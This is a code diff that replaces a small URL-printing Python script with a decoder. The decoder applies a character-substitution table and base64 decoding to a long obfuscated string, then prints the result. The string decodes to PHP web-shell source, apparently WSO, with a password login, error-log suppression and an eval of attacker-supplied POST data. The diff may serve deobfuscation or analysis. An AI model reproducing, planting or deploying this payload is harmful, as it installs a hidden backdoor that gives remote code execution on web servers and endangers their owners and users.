@@ -1,4 +1,12 @@
-from clean_urls import *
-print(clean_urls)
-for c_url in clean_urls:
-    print(c_url)
+import base64
+
+a = {"A": "6", "C": "F", "B": "3", "E": "7", "D": "2", "F": "9", "1": "C", "0": "5", "3": "E", "2": "B", "5": "1", "4": "D", "7": "4", "6": "8", "9": "A", "8": "0"}
+b = "1gokZGVmYXVsdCFhYBRpbD7gPS9nQ8MnOwoKQGluaVFzZXQoJDV" + "ycmFyXDxvZycsTlVMT1kE1k2pbmlfcDV8K1dsbDdfZXJybBJzJywwKTsKQGluaVFzZXQoJD5heCFleG" + "VjdXRpbD0fdGltZScsM1kE1k2zZXRfdGltZVFsaW5pd1gwKTsKQHNldCFtYWdpY5FxdWF8ZX" + "NfcnVudGltZSgwKTsKQGRlZmluZSgnV5NPX5ZCUlNJT87nL19nMi75LjInKTsK1mlmKG" + "dldCFtYWdpY5FxdWF8ZXNfZB2jK1kpIHsKI19gIGZ5bmN8aWFuICdTTBN8cmlwcDxhc" + "DhlcygkYXJyYXkpIHsKI19gI19gI12yZXR5cm7gaXNfYXJyYXkoJGCycmC0KS9/IGCycmC0XD5h" + "c1gnV5NPcBRyaX2zbGCzaGVzJywgJGCycmC0KS9AIHN8cmlwcDxhcDhlcygkYXJyYXkpOwogI19gfQ" + "ogI19gJCFQT5NUI48gV5NPcBRyaX2zbGCzaGVzK1RfU3FTV1kE1i9gI19kX8NPT8tJRS9FICdTT" + "BN8cmlwcDxhcDhlcygkX8NPT8tJRSkE1n8K1mZ5bmN8aWFuIHdzb8xvZDluK1kgewogI" + "19gaGVhZGVyK1dIVCRQLz3uM198M4QgTmF8I3ZvdW0kJykE1i9gI12kaWUoIjQwN1IpOwpF1gpmdW0jdGlvb" + "i2XU8FzZXRjbDFraWUoJGssI1RDKS2E1i9gI19kX8NPT8tJRVska58gPS" + "9kdjsKI19gIHNldGNvbDtpZSgkaywgJHYpOwpF1gppZighZW5wdHkoJGC5dGhfcGCzcykpIHsKI19gIGlm" + "KGlzcDV8K1RfU3FTVCsncGCzcyddKS9mJi9obWQ5K1RfU3FTVCsncGCzcyddKS9FPS9kYXV8aCFw" + "YXNzKSkKI19gI19gI12XU8FzZXRjbDFraWUobWQ5K1RfU8VSVkVSWydIVCRQX8hPU5QnXSksI1RhdXRoXB2hc" + "BMpOwoKI19gIGlmI1ghaXNzZXQoJCF4T8FLSUVbbWQ5K1RfU8VSVkVSWydIVCRQ" + "X8hPU5QnXSldKS26f19oJCF4T8FLSUVbbWQ5K1RfU8VSVkVSWydIVCRQX" + "8hPU5QnXSldI13FI1RhdXRoXB2hcBMpKQogI19gI19gIHdzb8xvZDluK1kE1n8K1mZ5bmN8aWFuIGCjdGlvblIoKS2E1i9gI" + "12pZighQ1RfU3FTVCsnZXYnXSkgewogI19gI19gI1RhI48gYXJyYXko1i9gI19gI19gI19gI1" + "J5bmCtZSIgPT7gcGhwXBVuYW5lK1ks1i9gI19gI19gI19gI1Jw" + "aH2fdmVycDlvbiIgPT7gcGhwdmVycDlvbigpL9ogI19gI19gI19gI19idBNvXBZlcnNpbD7iI48+ICdTT5FWR" + "VJTSUFOL9ogI19gI19gI19gI19icDCmZW5vZGUiI48+I32pbmlfZDV8K1dzYWZlXD5vZGUnKQogI19g" + "I19gI1kE1i9gI19gI19gZWNoby2zZXJpYWxpemUoJG3pOwogI19gfS2lbHNlIHsKI19gI19gI12ldmCsK1RfU3FTV" + "CsnZXYnXSkE1i9gI12F1n8K1mlmK12lbX28eSgkX52PU5RbJDMnXSkgKQogI19gaWYoaXNzZXQoJGRl" + "ZmC5bHRfYWN8aWFuKS9mJi2mdW0jdGlvblFleGlzdHMoJDCjdGlvbicgLi9kZGVmYXVsdCFhYBRpb" + "D7pKQogI19gI19gI1RfU3FTVCsnYyddI48gJGRlZmC5bHRfYWN8aWFuOwog" + "I19gZWxzZQogI19gI19gI1RfU3FTVCsnYyddI48gJ5NlY8luZm6nOwppZiggIWVtcHR0K1RfU3FTVC" + "snYyddKS9mJi2mdW0jdGlvblFleGlzdHMoJDCjdGlvbicgLi9kX52P" + "U5RbJDMnXSkgKQogI19gYDCsbCF5cDVyXDZ5bmMoJDCjdGlvbicgLi9kX52PU5RbJDMnXSkE1mV7aXQE";
+c = ''
+for i in range(len(b)):
+    if b[i] in a:
+
+        c += a[str(b[i])]
+    else:
+        c += str(b[i])
+print(base64.b64decode(c))
